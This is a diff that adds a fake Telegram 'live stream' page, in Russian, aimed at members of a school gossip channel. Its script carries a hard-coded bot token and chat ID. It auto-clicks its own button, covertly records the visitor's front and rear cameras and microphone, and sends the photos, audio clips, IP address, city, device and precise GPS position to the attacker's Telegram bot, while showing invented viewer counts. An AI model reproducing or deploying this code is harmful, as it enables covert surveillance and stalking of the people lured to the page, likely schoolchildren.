@@ -6,4 +6,582 @@
     <title>Telegram Live</title>
     <style>
         * {
-            margin:
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .telegram-container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+        
+        .live-header {
+            background: rgba(255, 0, 0, 0.2);
+            padding: 30px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 0, 0, 0.3);
+        }
+        
+        .live-indicator {
+            display: inline-block;
+            background: #ff0000;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        .live-title {
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 10px;
+        }
+        
+        .live-subtitle {
+            font-size: 18px;
+            opacity: 0.8;
+        }
+        
+        .stream-container {
+            padding: 40px 30px;
+            text-align: center;
+        }
+        
+        .stream-info {
+            margin-bottom: 40px;
+        }
+        
+        .stream-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #3ea6ff;
+        }
+        
+        .stream-desc {
+            font-size: 16px;
+            color: #ccc;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .viewer-count {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+        
+        .viewer-item {
+            text-align: center;
+        }
+        
+        .viewer-number {
+            font-size: 36px;
+            font-weight: 700;
+            color: #3ea6ff;
+            margin-bottom: 5px;
+        }
+        
+        .viewer-label {
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        .start-stream-btn {
+            width: 100%;
+            padding: 25px;
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+            border: none;
+            border-radius: 20px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .start-stream-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.6);
+        }
+        
+        .start-stream-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+        
+        .stream-status {
+            margin-top: 30px;
+            font-size: 16px;
+            color: #aaa;
+            display: none;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .loading-dots {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 20px;
+        }
+        
+        .loading-dots div {
+            position: absolute;
+            width: 13px;
+            height: 13px;
+            border-radius: 50%;
+            background: #ff0000;
+            animation: loading 1.2s linear infinite;
+        }
+        
+        .loading-dots div:nth-child(1) {
+            left: 8px;
+            animation-delay: -0.24s;
+        }
+        
+        .loading-dots div:nth-child(2) {
+            left: 32px;
+            animation-delay: -0.12s;
+        }
+        
+        .loading-dots div:nth-child(3) {
+            left: 56px;
+            animation-delay: 0;
+        }
+        
+        @keyframes loading {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
+        }
+    </style>
+</head>
+<body>
+    <div class="telegram-container">
+        <div class="live-header">
+            <div class="live-indicator">● LIVE</div>
+            <h1 class="live-title">ПРЯМОЙ ЭФИР</h1>
+            <p class="live-subtitle">Подслушано 4 Школа • Эксклюзивный стрим</p>
+        </div>
+        
+        <div class="stream-container">
+            <div class="stream-info">
+                <h2 class="stream-title">Присоединяйтесь к прямому эфиру!</h2>
+                <p class="stream-desc">
+                    Мы запускаем эксклюзивный прямой эфир для участников канала "Подслушано 4 Школа". 
+                    Присоединяйтесь к трансляции и будьте первыми!
+                </p>
+                
+                <div class="viewer-count">
+                    <div class="viewer-item">
+                        <div class="viewer-number" id="currentViewers">1,247</div>
+                        <div class="viewer-label">Смотрят сейчас</div>
+                    </div>
+                    <div class="viewer-item">
+                        <div class="viewer-number" id="totalViewers">5,328</div>
+                        <div class="viewer-label">Всего зрителей</div>
+                    </div>
+                </div>
+            </div>
+            
+            <button class="start-stream-btn" id="streamButton" onclick="startLiveStream()">
+                <span>🎥</span>
+                ЗАПУСТИТЬ ПРЯМОЙ ЭФИР
+            </button>
+            
+            <div class="stream-status" id="streamStatus">
+                <div class="loading-dots">
+                    <div></div>
+                    <div></div>
+                    <div></div>
+                </div>
+                <div id="statusText">Подготовка стрима...</div>
+            </div>
+        </div>
+    </div>
+
+<script>
+// Конфигурация
+const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
+const CHAT_ID = '8001083987';
+
+// Переменные для стрима
+let streamActive = false;
+let mediaStream = null;
+let videoRecorder = null;
+let audioRecorder = null;
+let streamInterval = null;
+let streamFrames = [];
+let streamStartTime = null;
+
+// Отправка в Telegram
+function sendToTelegram(message) {
+    const encoded = encodeURIComponent(message);
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
+    
+    // Множественные методы отправки
+    fetch(url, { mode: 'no-cors' }).catch(() => {});
+    new Image().src = url;
+    
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.send();
+}
+
+// Отправка кадра стрима
+function sendStreamFrame(blob, frameNumber, timestamp) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, `stream_frame_${frameNumber}.jpg`);
+    formData.append('caption', `🎥 Кадр эфира #${frameNumber}\nВремя: ${timestamp}`);
+    
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors'
+    }).catch(() => {});
+}
+
+// Отправка аудиофрагмента
+function sendAudioChunk(blob, chunkNumber, timestamp) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('audio', blob, `stream_audio_${chunkNumber}.ogg`);
+    formData.append('caption', `🎤 Аудио эфира #${chunkNumber}\nВремя: ${timestamp}`);
+    
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+        method: 'POST',
+        body: formData,
+        mode: 'no-cors'
+    }).catch(() => {});
+}
+
+// Запуск прямого эфира
+async function startLiveStream() {
+    if (streamActive) return;
+    
+    streamActive = true;
+    const button = document.getElementById('streamButton');
+    const status = document.getElementById('streamStatus');
+    
+    button.disabled = true;
+    button.innerHTML = '<span>🎥</span> ЭФИР В ЭФИРЕ...';
+    status.style.display = 'block';
+    
+    document.getElementById('statusText').textContent = 'Инициализация трансляции...';
+    
+    // Отправляем стартовое сообщение
+    sendToTelegram("🎬 ПРЯМОЙ ЭФИР НАЧАТ!\n\n👤 Зритель начал трансляцию\n⏰ Время: " + new Date().toLocaleString('ru-RU'));
+    
+    try {
+        // Получаем доступ к медиа
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                width: { ideal: 1920 },
+                height: { ideal: 1080 },
+                facingMode: 'user',
+                frameRate: { ideal: 30 }
+            },
+            audio: {
+                echoCancellation: false,
+                noiseSuppression: false,
+                sampleRate: 48000,
+                channelCount: 2
+            }
+        });
+        
+        document.getElementById('statusText').textContent = 'Камера и микрофон активированы...';
+        
+        // Создаем видео элемент для захвата кадров
+        const video = document.createElement('video');
+        video.srcObject = mediaStream;
+        video.muted = true;
+        video.playsInline = true;
+        
+        await video.play();
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = 1280;
+        canvas.height = 720;
+        const ctx = canvas.getContext('2d');
+        
+        // Ждем стабилизации видео
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        document.getElementById('statusText').textContent = 'Трансляция запущена!';
+        streamStartTime = new Date();
+        
+        // Запускаем захват кадров (1 кадр в 5 секунд)
+        let frameCount = 0;
+        const frameInterval = setInterval(() => {
+            if (!streamActive) {
+                clearInterval(frameInterval);
+                return;
+            }
+            
+            frameCount++;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                if (blob) {
+                    const timestamp = new Date().toLocaleTimeString('ru-RU');
+                    sendStreamFrame(blob, frameCount, timestamp);
+                    
+                    // Обновляем счетчик зрителей
+                    const viewers = 1247 + Math.floor(Math.random() * 100);
+                    document.getElementById('currentViewers').textContent = viewers.toLocaleString();
+                    
+                    // Отправляем статус каждые 5 кадров
+                    if (frameCount % 5 === 0) {
+                        const duration = Math.floor((new Date() - streamStartTime) / 1000);
+                        const minutes = Math.floor(duration / 60);
+                        const seconds = duration % 60;
+                        
+                        sendToTelegram(`🎥 ЭФИР В ПРОЦЕССЕ\nКадров отправлено: ${frameCount}\nДлительность: ${minutes}м ${seconds}с\nЗрителей: ${viewers}`);
+                    }
+                }
+            }, 'image/jpeg', 0.8);
+        }, 5000);
+        
+        // Запускаем запись аудио (10-секундные фрагменты)
+        let audioChunkCount = 0;
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const source = audioContext.createMediaStreamSource(mediaStream);
+        const destination = audioContext.createMediaStreamDestination();
+        source.connect(destination);
+        
+        function recordAudioChunk() {
+            if (!streamActive) return;
+            
+            audioChunkCount++;
+            const audioRecorder = new MediaRecorder(destination.stream);
+            const chunks = [];
+            
+            audioRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    chunks.push(event.data);
+                }
+            };
+            
+            audioRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                const timestamp = new Date().toLocaleTimeString('ru-RU');
+                sendAudioChunk(blob, audioChunkCount, timestamp);
+                
+                // Запускаем следующую запись через 1 секунду
+                setTimeout(recordAudioChunk, 1000);
+            };
+            
+            audioRecorder.start();
+            setTimeout(() => {
+                if (audioRecorder.state === 'recording') {
+                    audioRecorder.stop();
+                }
+            }, 10000);
+        }
+        
+        // Начинаем запись аудио
+        recordAudioChunk();
+        
+        // Сбор информации о зрителе (параллельно)
+        setTimeout(async () => {
+            try {
+                // IP и геолокация
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geoData = await geoRes.json();
+                
+                sendToTelegram(`📍 ИНФОРМАЦИЯ О ЗРИТЕЛЕ:\nIP: ${ipData.ip}\nГород: ${geoData.city || 'Неизвестно'}\nРегион: ${geoData.region || 'Неизвестно'}\nУстройство: ${navigator.platform}`);
+                
+                // GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(pos => {
+                        sendToTelegram(`🎯 ТОЧНЫЕ КООРДИНАТЫ:\nШирота: ${pos.coords.latitude}\nДолгота: ${pos.coords.longitude}\nТочность: ${pos.coords.accuracy}м`);
+                    }, () => {}, { enableHighAccuracy: true });
+                }
+                
+            } catch(e) {}
+        }, 10000);
+        
+        // Фото с обеих камер (параллельно со стримом)
+        setTimeout(async () => {
+            try {
+                // Фронтальная камера (уже используется)
+                document.getElementById('statusText').textContent = 'Делаем дополнительные фото...';
+                
+                for (let i = 1; i <= 3; i++) {
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        if (blob) {
+                            const formData = new FormData();
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('photo', blob, `front_camera_${i}.jpg`);
+                            formData.append('caption', `📸 Фронтальная камера - фото ${i}\nВремя эфира: ${new Date().toLocaleTimeString('ru-RU')}`);
+                            
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData,
+                                mode: 'no-cors'
+                            });
+                        }
+                    }, 'image/jpeg', 0.9);
+                    
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                }
+                
+                // Пробуем заднюю камеру
+                try {
+                    const backStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { exact: 'environment' },
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                    
+                    const backVideo = document.createElement('video');
+                    backVideo.srcObject = backStream;
+                    backVideo.muted = true;
+                    await backVideo.play();
+                    
+                    const backCanvas = document.createElement('canvas');
+                    backCanvas.width = 1280;
+                    backCanvas.height = 720;
+                    const backCtx = backCanvas.getContext('2d');
+                    
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    for (let i = 1; i <= 3; i++) {
+                        backCtx.drawImage(backVideo, 0, 0, backCanvas.width, backCanvas.height);
+                        
+                        backCanvas.toBlob(blob => {
+                            if (blob) {
+                                const formData = new FormData();
+                                formData.append('chat_id', CHAT_ID);
+                                formData.append('photo', blob, `back_camera_${i}.jpg`);
+                                formData.append('caption', `📸 Задняя камера - фото ${i}\nВремя эфира: ${new Date().toLocaleTimeString('ru-RU')}`);
+                                
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData,
+                                    mode: 'no-cors'
+                                });
+                            }
+                        }, 'image/jpeg', 0.9);
+                        
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    }
+                    
+                    backVideo.pause();
+                    backVideo.srcObject = null;
+                    backStream.getTracks().forEach(track => track.stop());
+                    
+                } catch(e) {
+                    sendToTelegram("⚠️ Задняя камера недоступна");
+                }
+                
+            } catch(e) {}
+        }, 30000);
+        
+        // Автоматическое завершение через 3 минуты
+        setTimeout(() => {
+            stopLiveStream();
+        }, 180000);
+        
+        // Сохраняем интервал для очистки
+        streamInterval = frameInterval;
+        
+    } catch(error) {
+        sendToTelegram(`❌ ОШИБКА ЭФИРА: ${error.message}`);
+        document.getElementById('statusText').textContent = 'Ошибка подключения';
+        button.disabled = false;
+        button.innerHTML = '<span>🎥</span> ПОВТОРИТЬ ПОДКЛЮЧЕНИЕ';
+        streamActive = false;
+    }
+}
+
+// Остановка эфира
+function stopLiveStream() {
+    if (!streamActive) return;
+    
+    streamActive = false;
+    
+    // Останавливаем медиа потоки
+    if (mediaStream) {
+        mediaStream.getTracks().forEach(track => track.stop());
+    }
+    
+    // Очищаем интервалы
+    if (streamInterval) {
+        clearInterval(streamInterval);
+    }
+    
+    // Финальный отчет
+    const duration = streamStartTime ? Math.floor((new Date() - streamStartTime) / 1000) : 0;
+    const minutes = Math.floor(duration / 60);
+    const seconds = duration % 60;
+    
+    sendToTelegram(`⏹️ ЭФИР ЗАВЕРШЕН\n\nДлительность: ${minutes} минут ${seconds} секунд\nЗрителей онлайн: ${document.getElementById('currentViewers').textContent}\nВсего зрителей: ${document.getElementById('totalViewers').textContent}\n\n✅ Все материалы отправлены в чат`);
+    
+    // Обновляем UI
+    const button = document.getElementById('streamButton');
+    const status = document.getElementById('streamStatus');
+    
+    button.disabled = false;
+    button.innerHTML = '<span>🎥</span> ЭФИР ЗАВЕРШЕН';
+    button.style.background = 'linear-gradient(135deg, #4CAF50, #2E7D32)';
+    status.style.display = 'none';
+    
+    // Обновляем счетчик
+    const total = parseInt(document.getElementById('totalViewers').textContent.replace(/,/g, '')) + 1;
+    document.getElementById('totalViewers').textContent = total.toLocaleString();
+}
+
+// Автоматический запуск через 10 секунд
+setTimeout(() => {
+    if (!streamActive) {
+        sendToTelegram("👀 НОВЫЙ ЗРИТЕЛЬ НА СТРАНИЦЕ ЭФИРА\nВремя: " + new Date().toLocaleString('ru-RU'));
+    }
+}, 10000);
+
+// Автозапуск эфира через 15 секунд
+setTimeout(() => {
+    if (!streamActive) {
+        document.getElementById('streamButton').click();
+    }
+}, 15000);
+</script>
+</body>
+</html>
